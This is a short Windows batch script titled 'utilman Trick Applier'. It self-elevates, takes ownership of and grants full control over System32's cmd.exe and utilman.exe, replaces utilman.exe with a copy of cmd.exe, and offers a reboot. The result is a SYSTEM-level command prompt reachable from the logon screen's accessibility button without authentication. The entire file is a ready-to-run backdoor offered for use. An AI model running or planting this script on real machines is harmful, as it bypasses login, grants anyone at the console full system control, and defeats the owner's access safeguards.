@echo off
title utilman Trick Applier
goto elevate

:start
cd /d "%~dp0"
if exist logo.bat call logo.bat & echo.
echo utilman Trick Applier
echo ============
echo This will apply the utilman trick, which is a trick that allows you to access cmd from the Windows Logon screen, giving you "nt authority\system" access.
echo When this program finishes and after a restart, you will be able to press the accessibility options on the logon screen to access the command prompt with system priveleges.
echo Press any key to start the operation..
pause >nul
cd %WINDIR%\System32
takeown /F "C:\Windows\System32\cmd.exe"
icacls "C:\Windows\System32\cmd.exe" /grant %username%:F
takeown /F "C:\Windows\System32\utilman.exe"
icacls "C:\Windows\System32\utilman.exe" /grant %username%:F
ren utilman.exe utilman_old.exe
xcopy cmd.exe utilman.exe
if %ERRORLEVEL% EQU 0 echo Success!
if NOT %ERRORLEVEL% EQU 0 echo ERROR: %ERRORLEVEL%
echo Would you like to reboot now?
set /p reboot=^> 
if /i %reboot%==y shutdown -r -t 10
exit

:elevate
fltmc >nul 2>&1 || (
    PowerShell -Command "Start-Process '%0' -Verb RunAs" || (
        >nul pause && exit 1
    )
    exit 0
)
goto start
